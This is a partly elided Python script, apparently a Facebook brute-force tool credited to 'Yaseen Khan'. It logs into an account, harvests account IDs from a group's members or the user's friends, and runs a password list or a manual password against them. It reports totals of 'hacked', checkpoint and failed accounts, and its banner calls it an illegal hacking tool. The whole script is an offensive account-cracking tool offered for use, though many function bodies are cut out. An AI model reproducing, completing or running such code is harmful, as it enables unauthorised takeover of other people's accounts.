...
def simpan():
	...
	if len(id_bteman) != 0:
		...
		try:
			...
			tampil('\rm[!]Login failed. Invailid email or Password')
def buka(d):
	tampil('\rh[*]Loging in \rp'+d)
	try:
		x = br.open(d)
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		tampil('\rh[*]Welcome \rk%s\n\rh[*]This iS your lucky Day! Enjoy Hacking....'%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm[!]Account got a Checkpoint\n\rk[!]Plz Login to opera mini and Confirm checkpoint and Try again')
		keluar()
	else:
...
def saring_id_group0():
	...
	while 1:
		...
		try:
			...
			tampil('\rm[!]Id you Entered is imcorrect')
			continue
	tampil('\rh[*]Retreive idz From Group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rh[*]Login your account...')
		login()
		if log == 0:
			keluar()
	...
	while 1:
		...
		try:
			...
			tampil('\rm[!]Only CAN take... \rh %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?]Start crack Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
def idteman():
	...
	try:
		...
		if len(id_teman) != 0:
			tampil('\rm[!]Can Only take
			... \rp%d id'%len(id_bteman))
		else:
			tampil('\rm[!]Batal')
			keluar()
	while 1:
...
class mt(threading.Thread):
    ...
    def run(self):
        ...
        if 'm_sess' in data.url or 'save-device' in data.url:
            ...
            self.a = 0
def crack(d):
	i = inputD('[?] Passwordlist/Manual pass (p/m)',['P','M'])
	if i.upper() == 'P':
		while 1:
			dir = inputD('[?]choose File')
			try:
				...
				continue
			break
		tampil('\rh[*]start hacking \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Not satisfied With password? Try again (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
...
def crack0(data,sandi,p):
	tampil('\rh[*]MyCrack \rk%d Hack \rhAccount With password \rm[\rk%s\rm]'%(len(data),sandi))
	...
	if len(akun_sukses) != 0:
		tampil('\rh[*]Hacked accounts ')
		for i in akun_sukses:
			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
	tampil('\rh[*]Total hacked accounts\rp      %d'%len(akun_sukses))
	tampil('\rm[*]Hacking Failed Idz\rp         %d'%len(akun_gagal))
	tampil('\rk[*]Checkpoint Accounts\rp      %d'%len(akun_cekpoint))
	tampil('\rc[*]Number of Error Accounts\rp         %d'%len(akun_error))
	if p:
...
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?]Research Friend ID Results / continue (r/l)',['R','L'])
		if i.upper() == 'L':
...
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?]Group Id Result Research / continue (r/l)',['R','L'])
		if i.upper() == 'L':
...
def menu():
	tampil('''\rh
            ...
            \rk*   *\rh /+/++//
             \ /  |/__//
           {\rmX\rh}v{\rmX\rh}|\rcYASEEN\rh|==========.
             [']  /'|'\           \\
                 /  \  \           '
                 \_  \_ \_    \rk*\rh Yaseen Khan
\rk###########################################################
#             \rb*FaceBook BrUte Attacks*\rk                 #
# \rh  BY\rp                                       Yaseen \rk#
# \rhMAZY MARO\rp  ENJOY HACKING =D \rk#
# \rhTHIS TOOL IS A ILLEGAL HACKING TOOL. USE IS ON YOUR OWN RISKK\rp                       \rk#
#       \rmDo Not Use This Tool For IllegaL Purpose          \rk#
###########################################################''')
	tampil('''\rk%s\n\rc1 \rhGROUP MEMBERS HACK\n\rc2 \r2 = FRI3NDS ACCOUNT HACK\n\rc3 \rmCancel\n\rk%s'''%('#'*20,'#'*20))
	i = inputM('[?]CHOOSE OPTION',[1,2,3])
	if i == 1:
		lanjutG()
		idgroup()
	elif i == 2:
